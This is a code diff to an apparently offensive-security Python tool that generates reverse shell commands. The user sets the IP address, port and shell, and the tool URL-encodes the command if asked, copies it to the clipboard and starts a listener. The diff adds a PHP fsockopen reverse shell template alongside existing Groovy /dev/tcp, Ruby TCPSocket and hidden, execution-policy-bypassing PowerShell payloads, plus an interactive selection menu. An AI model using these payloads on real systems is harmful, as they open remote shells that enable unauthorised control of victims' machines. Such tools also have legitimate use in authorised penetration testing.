@@ -5,7 +5,9 @@ import os
 import socket
 import urllib.parse
 from string import Template
+from typing import List
 
+import readchar
 from colorama import Fore, Style
 from pyperclip import copy
 
@@ -21,6 +23,7 @@ command_key = 'nc plain'
 
 default_template = Template(
     Style.BRIGHT + '[ default ' + Fore.GREEN + '$param' + Fore.RESET + ' ]' + Style.RESET_ALL + ' : ')
+header_template = Template(Style.BRIGHT + '===== [ ' + Fore.CYAN + '$param' + Fore.RESET + ' ] =====' + Style.RESET_ALL)
 
 shells = {
     'sh': '/bin/sh',
@@ -46,6 +49,7 @@ commands = {
                      'p = r.exec(["$shell","-c","exec 5<>/dev/tcp/$ip/$port;'
                      'cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])'
                      'p.waitFor()'),
+    'php': Template('php -r \'$sock=fsockopen("$ip",$port);exec("$shell -i <&3 >&3 2>&3");\''),
     'ruby': Template('ruby -rsocket -e \'f=TCPSocket.open("$ip",$port).to_i;'
                      'exec sprintf("$shell -i <&%d >&%d 2>&%d",f,f,f)\''),
     'powershell': Template('powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object '
@@ -74,28 +78,62 @@ def exit_program():
     exit(0)
 
 
+def select(
+        options: List[str],
+        selected_index: int = 0) -> int:
+    print('\n' * (len(options) - 1))
+    while True:
+        print(f'\033[{len(options) + 1}A')
+        for i, option in enumerate(options):
+            print('\033[K{}{}'.format(
+                '\033[1m[\033[32;1m x \033[0;1m]\033[0m ' if i == selected_index else
+                '\033[1m[   ]\033[0m ', option))
+        keypress = readchar.readkey()
+        if keypress == readchar.key.UP:
+            new_index = selected_index
+            while new_index > 0:
+                new_index -= 1
+                selected_index = new_index
+                break
+        elif keypress == readchar.key.DOWN:
+            new_index = selected_index
+            while new_index < len(options) - 1:
+                new_index += 1
+                selected_index = new_index
+                break
+        elif keypress == readchar.key.ENTER:
+            break
+        elif keypress == readchar.key.CTRL_C:
+            raise KeyboardInterrupt
+    return selected_index
+
+
 def specify_ip():
+    print(header_template.safe_substitute(param='SPECIFY IP'))
     while True:
         global ip
-        input_ip = input('Specify IP address ' + default_template.safe_substitute(param=ip))
+        input_ip = input(default_template.safe_substitute(param=ip))
         if input_ip.__eq__(''):
             break
         elif is_valid(input_ip):
             ip = input_ip
-            print(information + 'IP changed to: ' + Style.BRIGHT + Fore.YELLOW + ip + Style.RESET_ALL)
+            print(information + 'IP changed to -> ' + Style.BRIGHT + Fore.YELLOW + ip + Style.RESET_ALL)
             break
+        else:
+            print(failure + 'Please, specify a valid IP address!')
 
 
 def specify_port():
+    print(header_template.safe_substitute(param='SPECIFY PORT'))
     while True:
         try:
             global port
-            input_port = input('Specify local port ' + default_template.safe_substitute(param=port))
+            input_port = input(default_template.safe_substitute(param=port))
             if input_port.__eq__(''):
                 break
             elif int(input_port) in range(1, 65535):
                 port = int(input_port)
-                print(information + 'Port changed to: ' + Style.BRIGHT + Fore.YELLOW + str(port) + Style.RESET_ALL)
+                print(information + 'Port changed to -> ' + Style.BRIGHT + Fore.YELLOW + str(port) + Style.RESET_ALL)
                 break
             else:
                 raise ValueError
@@ -103,54 +141,33 @@ def specify_port():
             print(failure + 'Choose a valid port number!')
 
 
-def choose_command():
-    for i, k in enumerate(commands):
-        print(str(i) + ') - ' + k)
-    while True:
-        try:
-            choice = input('Choose command from the above list ' + default_template.safe_substitute(
-                param=list(commands.keys()).__getitem__(0)))
-            if choice.__eq__(''):
-                break
-            elif int(choice) in range(0, len(commands)):
-                global command_key
-                command_key = list(commands.keys()).__getitem__(int(choice))
-                print(information + 'Using: ' + Style.BRIGHT + Fore.YELLOW + command_key + Style.RESET_ALL)
-                break
-            else:
-                raise
-        except ValueError:
-            print(failure + 'That\'s not a valid number!')
+def select_command():
+    print(header_template.safe_substitute(param='SELECT COMMAND'))
+    selected_command = select(list(commands.keys()))
+    global command_key
+    command_key = list(commands.keys()).__getitem__(selected_command)
 
 
-def choose_shell():
+def select_shell():
     if command_key != 'powershell':
-        for i, k in enumerate(shells):
-            print(str(i) + ') - ' + k)
-        while True:
-            try:
-                global shell
-                num = input('Choose a shell ' + default_template.safe_substitute(param=shell))
-                if num.__eq__(''):
-                    break
-                elif int(num) in range(0, len(shells)):
-                    shell = list(shells.values()).__getitem__(int(num))
-                    print(information + 'Using: ' + Style.BRIGHT + Fore.YELLOW + shell + Style.RESET_ALL)
-                    break
-                else:
-                    raise ValueError
-            except ValueError:
-                print(failure + 'Choose a number from the list!')
+        print(header_template.safe_substitute(param='SELECT SHELL'))
+        selected_shell = select(list(shells.keys()))
+        global shell
+        shell = list(shells.values()).__getitem__(selected_shell)
 
 
 def build_command():
     command = commands.get(command_key).safe_substitute(ip=ip, port=port, shell=shell)
-    url_encode = input('URL encode the command? [y/N] : ')
-    if url_encode.lower() == 'y':
+    encode_command = input('URL encode the command? [y/N] -> ')
+    if encode_command.lower() == 'y':
         command = urllib.parse.quote_plus(command)
         print(information + 'Command is now URL encoded!')
-    copy(command)
-    print(success + 'Reverse shell command copied to clipboard!')
+
+    print(success + 'The finished command is: \n\n' + command + '\n')
+
+    if 'SSH_CLIENT' not in os.environ or 'SSH_TTY' not in os.environ:
+        copy(command)
+        print(success + 'Reverse shell command copied to clipboard!')
 
 
 def setup_listener():
@@ -166,8 +183,8 @@ if __name__ == '__main__':
     try:
         specify_ip()
         specify_port()
-        choose_command()
-        choose_shell()
+        select_command()
+        select_shell()
         build_command()
         setup_listener()
     except KeyboardInterrupt:
